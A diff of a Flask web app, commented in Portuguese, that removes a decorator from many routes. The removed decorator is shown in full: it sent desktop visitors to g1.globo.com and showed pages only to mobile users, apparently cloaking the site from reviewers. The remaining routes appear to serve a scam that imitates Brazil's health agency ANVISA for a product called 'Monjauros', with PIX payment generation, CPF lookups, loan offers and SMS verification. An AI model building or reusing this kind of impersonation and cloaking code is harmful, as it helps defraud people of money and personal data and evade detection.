@@ -126,40 +126,6 @@ from pagamentocomdesconto import create_payment_with_discount_api
 # Domínio autorizado - Permitindo todos os domínios
 AUTHORIZED_DOMAIN = "*"
 
-def check_referer(f):
-    """Decorator para verificar o referer das requisições e aplicar regras de acesso"""
-    @functools.wraps(f)
-    def decorated_function(*args, **kwargs):
-        # Verificar se o usuário é mobile ou desktop
-        is_mobile = False
-        if hasattr(g, 'is_mobile'):
-            is_mobile = g.is_mobile
-        
-        # Verificar se estamos em modo de desenvolvimento
-        developing = os.environ.get('DEVELOPING', 'false').lower() == 'true'
-        
-        # Verificar se é uma requisição do Replit
-        referer = request.headers.get('Referer', '')
-        is_replit_request = 'replit' in referer.lower() or '.repl.' in referer.lower()
-        
-        # Em ambiente Replit, considerar como desenvolvimento
-        if is_replit_request:
-            developing = True
-        
-        # Verificar se a página é a de exemplo
-        is_exemplo_page = request.path.startswith('/exemplo')
-        
-        # Redirecionar desktops em produção (exceto replit e página de exemplo)
-        if not is_mobile and not developing and not is_replit_request and not is_exemplo_page:
-            app.logger.info(f"Redirecionando acesso desktop via check_referer: {referer}")
-            return redirect('https://g1.globo.com')
-            
-        # Permitir acesso para mobile ou em desenvolvimento
-        app.logger.info(f"Permitindo acesso para a rota: {request.path}")
-        return f(*args, **kwargs)
-        
-    return decorated_function
-
 # Se não existir SESSION_SECRET, gera um valor aleatório seguro
 if not os.environ.get("SESSION_SECRET"):
     os.environ["SESSION_SECRET"] = secrets.token_hex(32)
@@ -175,7 +141,6 @@ SMS_API_CHOICE = os.environ.get('SMS_API_CHOICE', 'OWEN')
 
 @app.route('/anvisa')
 @app.route('/anvisa/')
-@check_referer
 def anvisa():
     """Página principal do site da ANVISA sobre o produto Monjauros"""
     try:
@@ -944,7 +909,6 @@ def generate_qr_code(pix_code: str) -> str:
 
 @app.route('/')
 @app.route('/index')
-@check_referer
 def index():
     try:
         # Get data from query parameters for backward compatibility
@@ -1076,7 +1040,6 @@ def index():
         return jsonify({'error': 'Erro interno do servidor'}), 500
 
 @app.route('/payment')
-@check_referer
 def payment():
     try:
         app.logger.info("[PROD] Iniciando geração de PIX...")
@@ -1201,7 +1164,6 @@ def payment():
         return jsonify({'error': str(e)}), 500
 
 @app.route('/payment-update')
-@check_referer
 def payment_update():
     try:
         app.logger.info("[PROD] Iniciando geração de PIX para atualização cadastral...")
@@ -1284,7 +1246,6 @@ def payment_update():
         return jsonify({'error': str(e)}), 500
 
 @app.route('/check-payment-status/<transaction_id>')
-@check_referer
 def check_payment_status(transaction_id):
     try:
         # Obter informações do usuário da sessão se disponíveis
@@ -1480,7 +1441,6 @@ def check_discount_payment_status():
         return jsonify({"error": str(e)}), 500
 
 @app.route('/buscar-cpf')
-@check_referer
 def buscar_cpf():
     try:
         verification_token = os.environ.get('VERIFICATION_TOKEN')
@@ -1577,7 +1537,6 @@ def proxy_consulta_cpf():
         return jsonify({"error": f"Erro ao consultar CPF: {str(e)}"}), 500
 
 @app.route('/input-cpf')
-@check_referer
 def input_cpf():
     try:
         verification_token = os.environ.get('VERIFICATION_TOKEN')
@@ -1592,7 +1551,6 @@ def input_cpf():
         return jsonify({'error': 'Erro interno do servidor'}), 500
 
 @app.route('/analisar-cpf')
-@check_referer
 def analisar_cpf():
     try:
         app.logger.info("[PROD] Acessando página de análise de CPF: analisar_cpf.html")
@@ -1605,7 +1563,6 @@ def analisar_cpf():
         return jsonify({'error': 'Erro interno do servidor'}), 500
 
 @app.route('/opcoes-emprestimo')
-@check_referer
 def opcoes_emprestimo():
     try:
         # Get query parameters
@@ -1623,7 +1580,6 @@ def opcoes_emprestimo():
         return jsonify({'error': 'Erro interno do servidor'}), 500
 
 @app.route('/aviso')
-@check_referer
 def seguro_prestamista():
     try:
         # Get customer data from query parameters
@@ -1989,7 +1945,6 @@ def check_for4payments_status():
         return jsonify({'status': 'pending', 'error': str(e)})
 
 @app.route('/send-verification-code', methods=['POST'])
-@check_referer
 def send_verification_code_route():
     try:
         data = request.json
